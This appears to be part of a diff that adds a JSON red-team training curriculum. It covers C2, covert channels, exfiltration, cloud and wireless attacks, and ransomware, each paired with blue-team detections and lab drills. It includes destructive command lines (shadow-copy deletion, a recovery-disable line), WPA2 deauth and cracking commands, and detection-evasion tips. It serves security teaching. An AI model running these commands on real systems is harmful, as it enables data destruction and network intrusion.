+          "attack_techniques": ["T1071", "T1071.001", "T1071.004", "T1573", "T1573.002", "T1105", "T1090", "T1090.004"],
+          "killchain_stage": "command-and-control",
+          "defense_pairing": {
+            "what_blue_sees": "C2 communication creates periodic network connections (beaconing) to external IPs/domains. Blue team sees: regular interval connections (jitter patterns), DNS tunneling patterns, TLS certificate anomalies, known C2 IP/domain reputation hits, and beaconing behavioral patterns.",
+            "logs": ["Firewall/proxy logs (outbound HTTP(S) connections)", "DNS logs (DNS tunneling patterns, high-volume queries to single domain)", "Sysmon Event 3 (network connections from suspicious processes)", "Zeek network flow logs", "TLS inspection logs (certificate anomalies)"],
+            "detections": ["Beaconing detection (regular interval + jitter analysis)", "DNS tunneling detection (high entropy, long subdomains)", "Threat intel: known C2 IP/domain reputation matching", "JA3/JA3S TLS fingerprinting for C2 clients", "Sigma: known C2 framework signatures (Cobalt Strike default certificates)"],
+            "controls": ["Egress firewall (deny by default)", "DNS filtering/sinkholing", "TLS inspection (SSL decryption)", "Proxy with URL filtering", "Threat intelligence feeds", "Network behavioral analytics (NDR)"]
+          },
+          "drills": [
+            "Set up a Sliver or Havoc C2 server in a lab and generate an implant that beacons over HTTPS",
+            "Create a Malleable C2 profile for Cobalt Strike that mimics legitimate Amazon AWS traffic",
+            "Configure a DNS C2 channel and detect it using Zeek DNS analysis in the lab SIEM"
+          ],
+          "common_mistakes": [
+            "Using default Cobalt Strike certificates and ports (50050 for Team Server) — immediately detected",
+            "Beaconing with no jitter (perfect intervals) — behavioral detection tools flag regular periodic connections",
+            "Not using domain fronting or redirectors to hide the real C2 server IP"
+          ]
+        },
+        {
+          "id": "covert-c2-channels",
+          "title": "Covert C2 Channels & Domain Fronting",
+          "concepts": [
+            "Domain fronting: TLS SNI shows legitimate CDN domain (e.g., cloudfront.net) while HTTP Host header points to C2",
+            "Domain borrowing: using legitimate cloud services (AWS S3, Azure, GitHub, Google Drive) for C2 traffic",
+            "DNS tunneling: iodine, dnscat2 — encode C2 data in DNS queries/responses to bypass egress filtering",
+            "ICMP tunneling: using ICMP echo requests/replies for C2 data transfer",
+            "Steganographic C2: hiding C2 commands in image files (PNG, JPEG) posted to legitimate websites",
+            "Cloud-based C2: using legitimate services like Slack, Telegram, Google Drive, Dropbox for C2"
+          ],
+          "key_facts": [
+            "Domain fronting was widely used but many CDNs (AWS CloudFront, Google) have restricted or disabled it",
+            "dnscat2 creates a TCP tunnel over DNS — works even when only DNS (port 53) is allowed outbound",
+            "Cloud-based C2 (e.g., Slack, Google Drive) is very hard to block because organizations need these services",
+            "Steganographic C2 hides data in the least significant bits (LSB) of image pixels — undetectable by network monitoring",
+            "ICMP tunneling uses the data payload of ping packets — often not inspected by firewalls"
+          ],
+          "attack_techniques": ["T1090", "T1090.004", "T1071.004", "T1132.001", "T1001.002", "T1008"],
+          "killchain_stage": "command-and-control",
+          "defense_pairing": {
+            "what_blue_sees": "Covert C2 channels are extremely difficult to detect — they blend with legitimate traffic. Blue team relies on: DNS query analysis (tunneling patterns), cloud service API monitoring, behavioral baselining, and egress traffic anomaly detection. Domain fronting detection requires TLS inspection.",
+            "logs": ["DNS logs (high query volume to single domain, long subdomain labels)", "Proxy logs (connections to CDNs with unusual Host headers)", "Cloud service API logs (anomalous API calls)", "Network flow logs (ICMP traffic volume anomalies)"],
+            "detections": ["DNS tunneling detection (entropy analysis, query length, TXT record frequency)", "Cloud access security broker (CASB) anomaly detection", "NDR: protocol anomaly detection", "ICMP payload analysis", "Behavioral: unusual cloud service usage patterns"],
+            "controls": ["Egress DNS filtering (only approved DNS servers)", "Cloud Access Security Broker (CASB)", "ICMP rate limiting/payload inspection", "Egress allowlisting", "Network behavioral analytics"]
+          },
+          "drills": [
+            "Set up dnscat2 for DNS tunneling C2 in a lab environment and analyze the DNS traffic patterns",
+            "Configure domain fronting for a C2 implant and observe how it blends with legitimate CDN traffic",
+            "Detect DNS tunneling using Zeek DNS analysis scripts in a lab SIEM"
+          ],
+          "common_mistakes": [
+            "Generating too much DNS tunneling traffic — DNS tunneling is detectable via volume and entropy analysis",
+            "Using known domain fronting CDNs that have already patched this technique",
+            "Not accounting for TLS inspection — if SSL is decrypted at the proxy, domain fronting and steganography are visible"
+          ]
+        },
+        {
+          "id": "data-collection-and-staging",
+          "title": "Data Collection & Staging",
+          "concepts": [
+            "Data discovery: finding sensitive files, databases, source code, credentials, and intellectual property",
+            "Data staging: aggregating collected data into a single location (zip/archive) before exfiltration",
+            "Screen capture: capturing screenshots of desktop sessions for visual intelligence (T1113)",
+            "Audio/video capture: recording microphone or camera (T1123, T1125)",
+            "Keylogging: capturing keystrokes to steal credentials entered by the user (T1056.001)",
+            "Clipboard data: monitoring clipboard for copied passwords and sensitive data (T1115)",
+            "Browser data extraction: stealing saved passwords, cookies, and history from browsers (T1555.003)"
+          ],
+          "key_facts": [
+            "Data staging typically compresses collected files into a ZIP or RAR archive in a temp directory before exfiltration",
+            "Browser credential databases: Chrome/Edge use SQLite databases, Firefox uses logins.json and key4.db",
+            "Keyloggers can be kernel-level (difficult to detect) or user-mode (easier to detect but more common)",
+            "Sysmon Event 11 (FileCreate) can monitor staging directories (temp, appdata) for large archive creation",
+            "Data discovery often uses findstr/search for keywords: *.pdf, *.docx, *.xlsx, password*, confidential*"
+          ],
+          "attack_techniques": ["T1005", "T1213", "T1113", "T1056.001", "T1115", "T1555.003", "T1560"],
+          "killchain_stage": "collection",
+          "defense_pairing": {
+            "what_blue_sees": "Data collection and staging generates filesystem activity: mass file access, archive creation, keylogger process injection, and clipboard monitoring. Blue team sees: anomalous file access patterns (reading thousands of files), large file creation in temp directories, screen capture process activity, and browser database access.",
+            "logs": ["Sysmon Event 11 (file creation — staging archives)", "Sysmon Event 10 (process access — keylogger accessing other processes)", "Windows Event 4663 (object access — mass file reading)", "Sysmon Event 1 (screen capture/keylogger tools)", "File access audit logs"],
+            "detections": ["Sigma: mass file access patterns", "Sigma: archive creation in temp directories", "EDR: keylogger behavior (SetWindowsHookEx, GetAsyncKeyState)", "Behavioral: unusual data access volume", "DLP: sensitive data access patterns"],
+            "controls": ["Data Loss Prevention (DLP)", "File access auditing", "EDR with behavioral monitoring", "Information Rights Management (IRM)", "Data classification and access controls"]
+          },
+          "drills": [
+            "Use a script to discover and stage sensitive files from a lab Windows machine into a compressed archive",
+            "Deploy a user-mode keylogger in a lab and detect it using Sysmon Event 10 (process access) and behavioral rules",
+            "Extract saved passwords from a Chrome browser profile and identify how to detect this activity"
+          ],
+          "common_mistakes": [
+            "Staging data in obvious locations (Desktop, root of C:) — use temp directories or appdata",
+            "Creating extremely large staging archives that trigger DLP or file size monitoring alerts",
+            "Forgetting that data access patterns (reading thousands of files) are detectable by behavioral analytics"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cloud-and-wireless-attacks",
+      "title": "Cloud, Wireless & Infrastructure Attacks",
+      "difficulty": "advanced",
+      "prerequisites": ["active-directory-and-credentials", "privilege-escalation"],
+      "objective": "Attack cloud infrastructure (AWS, Azure, GCP) by abusing IAM permissions, compromise wireless networks, and exploit infrastructure weaknesses.",
+      "topics": [
+        {
+          "id": "aws-attack-paths",
+          "title": "AWS IAM Privilege Escalation & Attack Paths",
+          "concepts": [
+            "IAM privilege escalation: chaining permissions to escalate from low-privilege to admin (Rhino Security identified 21 paths)",
+            "Common escalation paths: iam:CreateAccessKey (steal credentials), iam:PassRole + lambda:CreateFunction (assume any role), sts:AssumeRole (cross-account)",
+            "S3 bucket attacks: public buckets, misconfigured policies, bucket enumeration",
+            "EC2 metadata service (IMDSv1): SSRF to 169.254.169.254 to steal IAM credentials from instances",
+            "Persistence: create new IAM users/keys, backdoor roles, create persistent Lambda functions",
+            "Tools: Pacu (AWS exploitation framework), CloudGoat (vulnerable AWS environments), Prowler (AWS security)"
+          ],
+          "key_facts": [
+            "iam:PassRole + lambda:CreateFunction allows assuming any role by creating a Lambda with that role and invoking it",
+            "AWS IMDSv2 requires a token (PUT request to get token, then GET with token) — IMDSv1 is unauthenticated",
+            "Pacu is the Metasploit of AWS — modular framework with modules for enumeration, escalation, and exfiltration",
+            "CloudTrail logs all API calls — but if you have iam:DeleteTrail, you can disable logging",
+            "STS temporary credentials (AccessKey + SecretKey + SessionToken) expire in 1-36 hours — must be refreshed"
+          ],
+          "attack_techniques": ["T1078.004", "T1098.001", "T1136.003", "T1071.001"],
+          "killchain_stage": "privilege-escalation",
+          "defense_pairing": {
+            "what_blue_sees": "AWS attacks generate CloudTrail API call logs. Blue team sees: unusual API calls from unexpected sources, new IAM user/key creation, role assumption chains, Lambda function creation, S3 access from unexpected IPs, and IMDS access patterns.",
+            "logs": ["AWS CloudTrail (all API calls)", "AWS CloudTrail Insights (anomalous API patterns)", "AWS Config (resource configuration changes)", "VPC Flow Logs (network traffic)", "AWS GuardDuty (threat detection)"],
+            "detections": ["GuardDuty: PrivilegeEscalation finding type", "CloudTrail: new IAM key creation alerts", "CloudTrail: unusual API call patterns (new source IP, new region)", "AWS Config: IAM policy changes", "SIEM: CloudTrail log analysis rules"],
+            "controls": ["IMDSv2 enforcement", "IAM least privilege", "AWS Organizations SCPs (Service Control Policies)", "CloudTrail logging in all regions", "GuardDuty", "MFA for IAM users", "Permission boundaries"]
+          },
+          "drills": [
+            "Use Pacu to enumerate an AWS environment, identify privilege escalation paths, and escalate to admin",
+            "Exploit an SSRF vulnerability to access IMDSv1 and extract IAM credentials, then use them with the AWS CLI",
+            "Set up CloudGoat and complete the privilege_escalation scenario"
+          ],
+          "common_mistakes": [
+            "Not checking if CloudTrail is enabled — your actions may be fully logged without you knowing",
+            "Assuming AWS root account is needed — most attacks use IAM roles and policies, not root",
+            "Forgetting that AWS STS credentials expire — you need to refresh them periodically during the engagement"
+          ]
+        },
+        {
+          "id": "azure-ad-and-entra-attacks",
+          "title": "Azure AD / Entra ID Attacks",
+          "concepts": [
+            "Azure AD authentication: OAuth 2.0, OpenID Connect, SAML — tokens, refresh tokens, app registrations",
+            "Password spray against Azure AD: Microsoft's Smart Lockout uses IP-based lockout (not per-account)",
+            "Token theft: stealing access/refresh tokens from compromised endpoints — tokens valid for 1 hour (access) / 90 days (refresh)",
+            "Illicit Consent Grant: tricking users into granting OAuth permissions to malicious app registrations",
+            "Azure AD Connect abuse: compromising the on-prem AD Connect server to manipulate cloud identities",
+            "Tools: AADInternals, ROADtools (Azure AD device registration abuse), Microsoft Graph API for enumeration"
+          ],
+          "key_facts": [
+            "Azure AD refresh tokens are valid for 90 days — stealing a refresh token provides long-term access without MFA",
+            "Azure AD Connect synchronizes on-prem AD to cloud — compromising it allows modifying cloud identities",
+            "Microsoft Graph API (graph.microsoft.com) is the primary API for Azure AD enumeration and manipulation",
+            "Conditional Access policies are the primary Azure AD access control — bypass if excluded or if compliant device",
+            "Primary Refresh Token (PRT) on Windows 10/11 devices enables SSO — can be stolen for persistent access"
+          ],
+          "attack_techniques": ["T1078.004", "T1098.001", "T1528", "T1606.002"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "Azure AD attacks generate sign-in logs, audit logs, and risk events. Blue team sees: unusual sign-in locations, impossible travel, MFA fatigue patterns, OAuth consent grants to unknown applications, Conditional Access policy changes, and PRT theft indicators.",
+            "logs": ["Azure AD sign-in logs (interactive, non-interactive, service principal)", "Azure AD audit logs (directory changes, app registrations)", "Microsoft 365 audit logs", "Conditional Access report-only logs", "Azure AD Identity Protection risk events"],
+            "detections": ["Azure AD Identity Protection: risky sign-ins, leaked credentials", "Conditional Access: impossible travel, unfamiliar locations", "Sigma: OAuth consent grant to non-approved apps", "Azure Sentinel: correlation rules for Azure AD abuse"],
+            "controls": ["Conditional Access policies (MFA, compliant device, location)", "Phishing-resistant MFA (FIDO2)", "OAuth app consent policies", "Privileged Identity Management (PIM)", "Azure AD Identity Protection", "Continuous Access Evaluation (CAE)"]
+          },
+          "drills": [
+            "Use AADInternals to enumerate Azure AD tenant information including users, groups, and applications",
+            "Set up an illicit consent grant attack in a lab Azure AD tenant and demonstrate token theft",
+            "Analyze Azure AD sign-in logs to detect a password spray attack pattern"
+          ],
+          "common_mistakes": [
+            "Not accounting for Conditional Access policies — they may block access from non-compliant devices or untrusted IPs",
+            "Forgetting that Azure AD sign-in logs are comprehensive — every authentication attempt is logged",
+            "Using stolen tokens without checking if Continuous Access Evaluation (CAE) has revoked them"
+          ]
+        },
+        {
+          "id": "gcp-and-container-attacks",
+          "title": "GCP Attack Paths & Container/Kubernetes Attacks",
+          "concepts": [
+            "GCP IAM: project-level roles, service account key abuse, compute instance metadata (similar to AWS IMDS)",
+            "GCP privilege escalation: iam.serviceAccounts.actAs + cloudfunctions.functions.create — impersonate service accounts",
+            "Kubernetes attacks: compromised pod to access cloud metadata, RBAC abuse, kubelet API exploitation",
+            "Container escapes: privileged containers, Docker socket mounting, kernel exploits, capabilities abuse",
+            "Service mesh abuse: Istio/Linkerd misconfigurations enabling lateral movement between microservices",
+            "Tools: Peirates (Kubernetes pentesting), Kube-hunter (K8s vulnerability scanner), Kubeletctl"
+          ],
+          "key_facts": [
+            "GCP service account keys are JSON files — if stolen, provide persistent access until revoked",
+            "Kubernetes RBAC escalation: verbs=['*'] resources=['*'] on clusterrole gives cluster-admin equivalent",
+            "Privileged containers (--privileged) can access host block devices, mount host filesystem, and escape isolation",
+            "Kubelet API on port 10250 allows running commands in pods — if misconfigured for anonymous access",
+            "GKE workload identity: if a pod has a Kubernetes service account mapped to a GCP SA, it can access GCP resources"
+          ],
+          "attack_techniques": ["T1078.004", "T1611", "T1610", "T1609", "T1525"],
+          "killchain_stage": "privilege-escalation",
+          "defense_pairing": {
+            "what_blue_sees": "Cloud and container attacks generate cloud audit logs (GCP Cloud Audit Logs), Kubernetes audit logs, and container runtime alerts. Blue team sees: unusual GCP API calls, Kubernetes RBAC changes, privileged container creation, anomalous pod-to-pod communication, and metadata service access.",
+            "logs": ["GCP Cloud Audit Logs (Admin Activity, Data Access)", "Kubernetes audit logs (API server requests)", "Container runtime logs (Docker/containerd)", "Falco/Sysdig runtime security alerts", "GCP Cloud Logging for IAM changes"],
+            "detections": ["GCP Security Command Center findings", "Falco: privileged container creation", "Falco: container accessing host filesystem", "Kubernetes audit: RBAC privilege escalation", "Behavioral: anomalous pod-to-pod traffic"],
+            "controls": ["GCP least-privilege IAM", "Pod Security Standards (restricted profile)", "Kubernetes Network Policies", "Workload Identity", "GKE Workload Identity", "Container runtime security (Falco)", "Read-only root filesystem"]
+          },
+          "drills": [
+            "Escape a privileged container in a lab Kubernetes cluster and access the host filesystem",
+            "Use Peirates to enumerate Kubernetes RBAC and escalate privileges to cluster-admin",
+            "Exploit GCP service account impersonation to escalate from a low-privilege service account"
+          ],
+          "common_mistakes": [
+            "Ignoring container runtime security tools (Falco) — they generate detailed alerts for container escapes",
+            "Not checking Kubernetes audit logs — every API call is logged and can reveal attack patterns",
+            "Assuming pod isolation is sufficient — network policies and pod security standards are needed"
+          ]
+        },
+        {
+          "id": "wireless-network-attacks",
+          "title": "Wireless Network Attacks",
+          "concepts": [
+            "WPA2-PSK cracking: capture 4-way handshake via deauth attack, crack offline with hashcat/aircrack-ng",
+            "Evil Twin attack: create rogue AP with same SSID, deauth clients, capture credentials via captive portal",
+            "Deauth attack: send forged 802.11 deauthentication frames to disconnect clients (forced handshake capture)",
+            "WPA3 attacks: Dragonblood vulnerabilities (CVE-2019-9494), downgrade attacks WPA3 to WPA2",
+            "WPA-Enterprise attacks: eapHammer/EvilGrade to capture EAP credentials, credential relay",
+            "Bluetooth/RFID/NFC attacks: Bluejacking, Bluesnarfing, RFID cloning"
+          ],
+          "key_facts": [
+            "WPA2 handshake capture requires monitor mode + deauth: aireplay-ng --deauth forces client reconnection",
+            "hashcat -m 22000 captures.hc22000 wordlist.txt cracks WPA2 PMKID or 4-way handshake",
+            "Evil Twin tools: airgeddon, wifiphisher, Fluxion — create rogue AP with captive portal",
+            "PMKID attack (CVE-2019-15126): clientless WPA2 cracking — capture PMKID from first EAPOL frame without needing a client",
+            "WPA3 uses SAE (Simultaneous Authentication of Equals) — resistant to offline dictionary attacks (but Dragonblood vulnerabilities exist)"
+          ],
+          "attack_techniques": ["T1557", "T1557.003", "T1437", "T1595"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "Wireless attacks generate anomalous 802.11 management frames, rogue AP beaconing with legitimate SSIDs, and sudden client disconnections. Blue team sees (via WIDS/WIPS): deauth frame floods, unauthorized APs with corporate SSIDs, and PMKID request anomalies.",
+            "logs": ["WIDS/WIPS alerts (rogue AP detection)", "Wireless controller logs (deauth frame patterns)", "NAC logs (client connecting to unauthorized AP)", "Captive portal authentication logs"],
+            "detections": ["WIDS: rogue AP detection (same SSID, different BSSID)", "WIDS: deauth frame flood detection", "WIPS: automatic containment of rogue APs", "NAC: anomalous client connections"],
+            "controls": ["WIDS/WIPS deployment", "WPA3 migration", "802.1X/NAC with certificate-based authentication", "Wireless client isolation", "Management Frame Protection (MFP/802.11w)", "Enterprise certificate validation"]
+          },
+          "drills": [
+            "Capture a WPA2 handshake using airodump-ng and aireplay-ng deauth, then crack with hashcat",
+            "Set up an Evil Twin AP with airgeddon and capture credentials via a captive portal in a lab",
+            "Perform a PMKID attack using hcxdumptool and hcxpcapngtool without needing a client to connect"
+          ],
+          "common_mistakes": [
+            "Using the wrong wireless card — need one that supports monitor mode and packet injection (e.g., Atheros AR9271)",
+            "Deauthing too aggressively — massive deauth floods are easily detected by WIDS",
+            "Not checking if Management Frame Protection (802.11w) is enabled — it blocks deauth attacks"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "exfiltration-and-impact",
+      "title": "Exfiltration, Impact & Post-Exploitation",
+      "difficulty": "advanced",
+      "prerequisites": ["lateral-movement-and-c2", "persistence-and-defense-evasion"],
+      "objective": "Exfiltrate data using covert channels, understand ransomware deployment and impact techniques, and produce professional engagement reports.",
+      "topics": [
+        {
+          "id": "data-exfiltration",
+          "title": "Data Exfiltration Techniques",
+          "concepts": [
+            "Exfiltration over C2 channel (T1041): sending data over the existing command-and-control connection",
+            "Exfiltration over alternative protocol (T1048): DNS, ICMP, SSH — different from the C2 protocol",
+            "Exfiltration over web service (T1567): cloud storage (AWS S3, Azure Blob, Google Drive), GitHub, Pastebin",
+            "Exfiltration over physical medium (T1052): USB drives, removable media",
+            "Scheduled transfer: exfiltrating data during off-hours to avoid detection",
+            "Rate-limited exfiltration: slow transfers ('low and slow') to stay under volume-based detection thresholds"
+          ],
+          "key_facts": [
+            "DNS exfiltration encodes data in subdomain labels (e.g., data123.attacker.com) — bypasses egress firewalls but is detectable via DNS monitoring",
+            "HTTPS exfiltration to cloud services (Google Drive, Dropbox, S3) is very hard to block because these are legitimate business services",
+            "Data compression before exfiltration reduces transfer size and time — typically ZIP or RAR with optional encryption",
+            "Low-and-slow exfiltration sends small chunks over long periods to avoid volume-based DLP and network monitoring thresholds",
+            "ICMP exfiltration hides data in ping payloads — often not inspected by firewalls"
+          ],
+          "attack_techniques": ["T1041", "T1048", "T1048.002", "T1048.003", "T1567", "T1567.002", "T1052", "T1029"],
+          "killchain_stage": "exfiltration",
+          "defense_pairing": {
+            "what_blue_sees": "Data exfiltration generates anomalous outbound data transfers, DNS tunneling patterns, and uploads to cloud storage. Blue team sees: large outbound transfers (especially outside business hours), DNS queries with high-entropy subdomains, uploads to unsanctioned cloud services, and DLP alerts on sensitive data movement.",
+            "logs": ["Network flow logs (large outbound transfers — NetFlow/Zeek)", "DNS logs (tunneling patterns — high entropy subdomains)", "Proxy logs (uploads to cloud services)", "DLP alerts (sensitive data egress)", "Firewall logs (unusual outbound connections)"],
+            "detections": ["DLP: sensitive data egress detection", "Network: anomalous outbound data volume alerts", "DNS: tunneling detection (entropy, query frequency)", "CASB: uploads to unsanctioned cloud services", "Behavioral: low-and-slow transfer pattern detection"],
+            "controls": ["Data Loss Prevention (DLP)", "Egress filtering (deny by default)", "Cloud Access Security Broker (CASB)", "Network behavioral analytics (NDR)", "DNS filtering", "Data classification and encryption"]
+          },
+          "drills": [
+            "Exfiltrate a staging archive from a lab machine over DNS using dnscat2 and detect it in DNS logs",
+            "Exfiltrate data over HTTPS to a cloud storage service and observe what DLP/CASB alerts fire",
+            "Perform low-and-slow exfiltration over an extended period and attempt to avoid volume-based detection"
+          ],
+          "common_mistakes": [
+            "Exfiltrating too much data too fast — massive outbound transfers trigger immediate alerts",
+            "Using well-known exfiltration tools (exfil frameworks) that have network signatures",
+            "Forgetting to encrypt exfiltrated data — intercepted plaintext data may reveal the engagement"
+          ]
+        },
+        {
+          "id": "ransomware-deployment",
+          "title": "Ransomware Deployment & Impact",
+          "concepts": [
+            "Ransomware kill chain: initial access -> privilege escalation -> lateral movement -> data theft -> encryption -> ransom demand",
+            "Double extortion: encrypt data AND threaten to publish stolen data if ransom is not paid",
+            "Encryption scope: full disk, file-level (user documents), volume shadow copy deletion (T1490)",
+            "Common ransomware families: LockBit, BlackCat/ALPHV, CL0P, Royal/BlackSuit, Akira",
+            "RaaS (Ransomware-as-a-Service): affiliates rent ransomware from operators, profit split (typically 70/30 or 80/20)",
+            "Impact techniques beyond encryption: data destruction (T1485), disk wiping (T1561), service disruption"
+          ],
+          "key_facts": [
+            "Double extortion (data theft + encryption) is now standard — even if backups exist, stolen data forces payment",
+            "Volume Shadow Copy deletion: vssadmin delete shadows /all /quiet — removes Windows backup snapshots (T1490)",
+            "LockBit is one of the most prolific RaaS families — uses AES-256 for file encryption and RSA-2048 for key exchange",
+            "Ransomware operators commonly disable security tools (EDR, AV) before deployment using defense evasion techniques",
+            "bcdeedit /set {default} recoveryenabled no — disables Windows Recovery Environment to prevent recovery"
+          ],
+          "attack_techniques": ["T1486", "T1490", "T1485", "T1561", "T1489", "T1529", "T1498"],
+          "killchain_stage": "impact",
+          "defense_pairing": {
+            "what_blue_sees": "Ransomware deployment is the most visible attack stage — mass file encryption, shadow copy deletion, and service disruption are loud. Blue team sees: vssadmin/bcdedit/wbadmin execution (Event 4688), mass file modifications (Sysmon Event 11), security tool disablement, and rapid network propagation.",
+            "logs": ["Windows Event 4688 (vssadmin delete shadows, bcdedit, wbadmin)", "Sysmon Event 11 (mass file modification/creation — encrypted files)", "Sysmon Event 1 (ransomware executable)", "EDR alerts (encryption behavior)", "Windows Event 7036 (services stopping)"],
+            "detections": ["Sigma: vssadmin delete shadows /all", "Sigma: bcdedit recoveryenabled no", "EDR: rapid mass file modification detection (ransomware behavior)", "Sigma: wbadmin delete system state backup", "Behavioral: mass file encryption patterns"],
+            "controls": ["Immutable/offline backups (3-2-1 rule)", "EDR with ransomware behavior detection", "Volume Shadow Copy protection", "Network segmentation (prevent lateral spread)", "Principle of least privilege (limit domain admin spread)", "Application allowlisting"]
+          },
+          "drills": [
+            "Trace a ransomware attack path from initial access through domain compromise and deployment in a lab environment",
+            "Execute vssadmin delete shadows and bcdedit commands on a lab machine and verify detection rules fire",
+            "Design a ransomware response plan: isolation, investigation, recovery from immutable backups"
+          ],
+          "common_mistakes": [
+            "Underestimating the speed of ransomware propagation — modern strains can encrypt thousands of hosts in hours",
+            "Not accounting for data exfiltration before encryption — double extortion means backups alone are not enough",
+            "Forgetting that ransomware operators disable security tools first — EDR must be tamper-protected"
+          ]
+        },
+        {
+          "id": "impact-techniques-and-defense",
+          "title": "Impact Techniques: Data Destruction & Availability Attacks",
+          "concepts": [
+            "Data destruction (T1485): overwriting files with random data, zeros, or specific patterns — unrecoverable",
+            "Disk wiping (T1561): wiping entire disk partitions including MBR/GPT — system will not boot",
+            "Inhibit system recovery (T1490): deleting backups, shadow copies, and recovery partitions",
+            "Service stop (T1489): stopping critical services to disrupt operations",
+            "Network DoS (T1498): SYN floods, amplification attacks (DNS, NTP, memcached)",
+            "Resource hijacking (T1496): cryptomining malware using CPU/GPU resources"
+          ],
+          "key_facts": [
+            "NotPetya (2017) was a wiper disguised as ransomware — destroyed data irrecoverably, caused $10B+ in damage",
+            "Master Boot Record (MBR) overwrite prevents system boot — detects via monitoring for raw disk write operations",
+            "SYN flood attack sends massive SYN packets without completing handshake — exhausts server connection queue",
+            "DNS amplification uses spoofed source IP and open DNS resolvers to amplify attack traffic (up to 70x amplification)",
+            "Cryptojacking malware (e.g., XMRig) mines Monero using victim CPU — detectable via CPU usage spikes"
+          ],
+          "attack_techniques": ["T1485", "T1561", "T1561.001", "T1561.002", "T1490", "T1489", "T1498", "T1496"],
+          "killchain_stage": "impact",
+          "defense_pairing": {
+            "what_blue_sees": "Impact techniques generate massive filesystem changes, service stop events, network traffic anomalies, and resource utilization spikes. Blue team sees: mass file deletion/overwrite events, service stop events (Event 7036), disk write operations to raw devices, and abnormal CPU/network usage patterns.",
+            "logs": ["Windows Event 4688 (format, cipher /w, sdelete execution)", "Sysmon Event 11 (mass file deletion/modification)", "Windows Event 7036 (services stopping)", "Network flow logs (DoS traffic patterns)", "Performance monitoring (CPU/memory spikes)"],
+            "detections": ["Sigma: mass file deletion patterns", "Sigma: disk formatting/wiping commands", "DDoS protection (Cloudflare, Arbor Networks)", "EDR: resource hijacking detection", "Behavioral: unusual service stoppage patterns"],
+            "controls": ["Immutable/offline backups", "DDoS protection services", "EDR with behavior-based detection", "Network rate limiting", "Disk write protection for critical partitions", "Containerization (isolate resource-intensive processes)"]
+          },
+          "drills": [
+            "Monitor a lab system during a simulated data destruction event and identify which logs and alerts fire",
+            "Set up CPU monitoring to detect cryptomining activity and create a detection rule for high sustained CPU usage",
+            "Design a backup strategy following the 3-2-1 rule and test recovery from a simulated ransomware event"
+          ],
+          "common_mistakes": [
+            "Assuming encrypted files can be recovered — data destruction (overwriting) makes files permanently unrecoverable",
+            "Not testing backup restoration — untested backups may fail when needed most",
+            "Ignoring insider threat potential for impact attacks — disgruntled admins can cause massive damage"
+          ]
+        },
+        {
+          "id": "reporting-and-post-exploitation",
+          "title": "Post-Exploitation Cleanup & Professional Reporting",
+          "concepts": [
+            "Cleanup: removing all dropped tools, persistence mechanisms, created accounts, and modifications",
+            "Reporting structure: executive summary, methodology, findings (with CVSS), risk ratings, remediation recommendations",
+            "Finding documentation: title, description, affected asset, proof of concept, impact, remediation steps",
+            "Risk rating: CVSS score + business context (Critical/High/Medium/Low/Informational)",
+            "Debrief: walkthrough of findings with technical team and executive stakeholders",
+            "Retest: verifying that remediation fixes the identified vulnerabilities after the client patches"
+          ],
+          "key_facts": [
+            "Executive summary should be 1-2 pages, non-technical, focused on business risk and key recommendations",
+            "Each finding should include: steps to reproduce, screenshots/evidence, CVSS score, and specific remediation",
+            "Cleanup checklist: remove all persistence, revert configuration changes, delete test accounts, remove tools",
+            "CVSS v3.1 severity: Critical (9.0-10.0), High (7.0-8.9), Medium (4.0-6.9), Low (0.1-3.9)",
+            "Reports should be delivered securely (encrypted) and include a confidentiality notice"
+          ],
+          "attack_techniques": [],
+          "killchain_stage": "exfiltration",
+          "defense_pairing": {
+            "what_blue_sees": "Blue team receives the penetration test report and uses it to improve detection coverage, patch vulnerabilities, and harden configurations. Each finding should be mapped to ATT&CK technique IDs for the blue team to create or improve detections.",
+            "logs": ["N/A — reporting phase"],
+            "detections": ["Blue team creates new Sigma/SIEM rules based on findings", "EDR rule updates for discovered techniques", "WAF rule additions for web vulnerabilities"],
+            "controls": ["Remediation tracking", "Risk acceptance documentation", "Patch management", "Configuration hardening", "Purple team exercises to validate detection coverage"]
+          },
+          "drills": [
+            "Write a professional penetration test report for a lab engagement including executive summary, technical findings, and remediation",
+            "Create a complete cleanup checklist and verify all artifacts from a lab engagement are removed",
+            "Map all findings from an engagement to ATT&CK technique IDs and provide the blue team with detection guidance"
+          ],
+          "common_mistakes": [
+            "Leaving persistence mechanisms or test accounts on client systems — always clean up thoroughly",
+            "Writing reports that are too technical for executives — provide a clear executive summary with business risk",
+            "Not providing specific, actionable remediation steps — vague recommendations like 'improve security' are useless"
+          ]
+        }
+      ]
+    }
+  ]
+}
